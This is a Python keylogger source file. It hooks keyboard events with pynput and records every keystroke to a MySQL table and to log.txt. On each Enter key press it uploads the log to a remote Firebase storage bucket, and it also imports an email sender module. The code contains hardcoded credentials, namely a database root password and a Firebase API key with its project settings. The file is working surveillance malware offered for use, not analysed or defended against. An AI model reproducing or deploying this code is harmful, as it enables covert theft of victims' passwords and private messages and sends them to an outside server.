# --------------------------------------------------------------------------------------------------------
# IMPORTING LIBRARIES

from pynput.keyboard import Key, Listener
import pyrebase
import uploadFirebase
import emailSender as es

# 🔥 NEW: MySQL imports
import mysql.connector
from datetime import datetime

# --------------------------------------------------------------------------------------------------------

currentPosition = 0
capsLockActive = False

# 🔥 MySQL Connection
conn = mysql.connector.connect(
    host="localhost",
    user="root",
    password="Zuhu@12#7sp",   # ⚠️ apna password daal
    database="keylogger"
)
cursor = conn.cursor()

# 🔥 Function to save key in DB
def save_to_db(key):
    try:
        time = datetime.now()
        query = "INSERT INTO keystrokes (key_pressed, timestamp) VALUES (%s, %s)"
        cursor.execute(query, (str(key), time))
        conn.commit()
    except Exception as e:
        print("DB Error:", e)

# --------------------------------------------------------------------------------------------------------

config = {
    "apiKey": "AIzaSyAboBophk8DAJBXmn4ltGZyGlYZnRqEpXQ",
    "authDomain": "keylogger-e4335.firebaseapp.com",
    "databaseURL": "https://keylogger-e4335-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "projectId": "keylogger-e4335",
    "storageBucket": "keylogger-e4335.appspot.com",
    "messagingSenderId": "880295281065",
    "appId": "1:880295281065:web:31b4dba6661594ba84c4b8",
    "measurementId": "G-YNJP3TKYWM"
}

firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

# --------------------------------------------------------------------------------------------------------

# Logging Keys into a file named - log.txt
def writeToFile(key):
    global currentPosition, capsLockActive

    # 🔥 SAVE TO DATABASE (IMPORTANT LINE)
    save_to_db(key)

    # Exit from keylogger when ESC pressed
    if key == Key.esc:
        return

    letter = str(key)
    letter = letter.replace("'", "")

    if key == Key.space:
        letter = " "

    elif key == Key.shift or key == Key.shift_r:
        letter = ''

    elif key == Key.ctrl_l or key == Key.ctrl_r:
        letter = ''

    elif key == Key.enter:
        letter = "\n"
        uploadFirebase.uploadToFirebase(storage, "log.txt", 1)

    elif key == Key.backspace:
        with open("log.txt", 'r+') as f:
            f.seek(0, 2)
            size = f.tell()
            if size > 0:
                f.seek(size - 1)
                nextchr = f.read()
                if(nextchr == "\n"):
                    f.seek(size - 2)
                else:
                    f.seek(size - 1)
                f.truncate()
                if currentPosition > 0:
                    currentPosition -= 1
        return

    elif key == Key.tab:
        letter = "    "

    elif key == Key.left:
        if currentPosition > 0:
            currentPosition -= 1
        return

    elif key == Key.right:
        with open("log.txt", 'r') as f:
            f.seek(currentPosition, 0)
            nextChar = f.read(1)
            if nextChar:
                currentPosition += 1
        return

    elif key == Key.caps_lock:
        capsLockActive = not capsLockActive
        return

    if capsLockActive and letter.isalpha():
        letter = letter.upper()

    file = open("log.txt", "r")
    l = len(file.read())

    if currentPosition >= l:
        with open("log.txt", "a") as f:
            f.write(letter)
            currentPosition += 1
    else:
        with open("log.txt", 'r+') as f:
            f.seek(currentPosition)
            suffixText = f.read()
            f.seek(currentPosition)
            f.write(letter + suffixText)
            currentPosition += len(letter)

    file.close()

# --------------------------------------------------------------------------------------------------------

def closeKLogger(key):
    if key == Key.esc:
        exit(0)

def start_keylogger():
    with Listener(on_press=writeToFile, on_release=closeKLogger) as l:
        l.join()

# --------------------------------------------------------------------------------------------------------